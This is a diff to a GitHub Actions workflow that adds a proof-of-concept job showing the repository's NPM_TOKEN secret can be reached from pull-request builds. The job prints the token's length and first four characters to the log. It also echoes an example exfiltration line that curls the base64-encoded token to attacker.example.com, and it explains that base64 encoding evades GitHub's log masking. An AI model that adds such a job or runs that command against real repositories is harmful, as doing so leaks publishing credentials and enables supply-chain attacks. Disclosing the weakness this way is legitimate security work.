@@ -24,3 +24,25 @@ jobs:
     steps:
       - uses: tetherto/oss-actions/node-base@v1
       - run: npm test
+
+  # PoC: Any PR from a same-repo branch can access repository secrets.
+  # This job demonstrates that NPM_TOKEN is reachable from build.yml
+  # because pull_request triggers use the workflow file from the PR branch.
+  poc-secret-exfiltration:
+    runs-on: ubuntu-latest
+    name: "PoC: NPM_TOKEN is accessible"
+    steps:
+      - name: Prove secret is accessible (base64 bypasses GitHub log masking)
+        env:
+          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
+        run: |
+          if [ -z "$NPM_TOKEN" ]; then
+            echo "::error::NPM_TOKEN is empty (expected if run from a fork PR)"
+            exit 1
+          fi
+          TOKEN_LENGTH=${#NPM_TOKEN}
+          TOKEN_PREFIX=${NPM_TOKEN:0:4}
+          echo "::warning::NPM_TOKEN is accessible! Length=${TOKEN_LENGTH}, Prefix=${TOKEN_PREFIX}..."
+          echo "A real attacker would exfiltrate the full token via:"
+          echo "  curl https://attacker.example.com/steal?t=\$(echo \$NPM_TOKEN | base64)"
+          echo "Base64 encoding bypasses GitHub's log masking which only redacts exact matches."
